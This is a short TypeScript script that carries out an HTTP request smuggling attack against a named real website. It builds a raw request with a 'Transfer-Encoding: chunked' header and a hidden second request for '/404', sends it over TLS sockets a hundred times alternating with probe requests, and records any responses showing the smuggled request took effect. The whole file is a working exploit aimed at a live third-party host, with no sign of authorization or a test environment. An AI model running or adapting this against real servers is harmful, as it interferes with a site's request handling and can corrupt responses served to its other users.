import { writeFileSync } from "fs";
import { createTLSSocket, readSocketData, writeAsync } from "../utils";

// config
const url = new URL("https://www.gaiia.com.tw/");
const forLoopTime = 100;
const attackRequest = `GET / HTTP/1.1
Host: www.gaiia.com.tw
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Host: www.gaiia.com.tw
Content-Length: 141

`.replaceAll("\n", "\r\n");
const outputFile = "C:\\Users\\samue\\Desktop\\responses.txt";
const handleResponse = (response: string, idx: number) => {
  if (response.includes("HTTP/1.1 404")) console.log({ response, idx });
};

// main
async function main() {
  const responses: string[] = [];
  for (let i = 1; i <= forLoopTime; i++) {
    console.log(i);
    // send request
    const tlsSocket = await createTLSSocket(url);
    const isSuccess = await writeAsync(tlsSocket, attackRequest);
    // destroy
    const isAttackRequest = i % 2 === 1;
    if (isAttackRequest) {
      tlsSocket.end();
      continue;
    }
    // handle response
    const responseBuffer = await readSocketData(tlsSocket);
    const response = responseBuffer.toString("utf8");
    tlsSocket.end();
    responses.push(response);
    handleResponse(response, i);
  }
  writeFileSync(outputFile, responses.join("\r\n\r\n=====\r\n\r\n"));
}

// call
main();
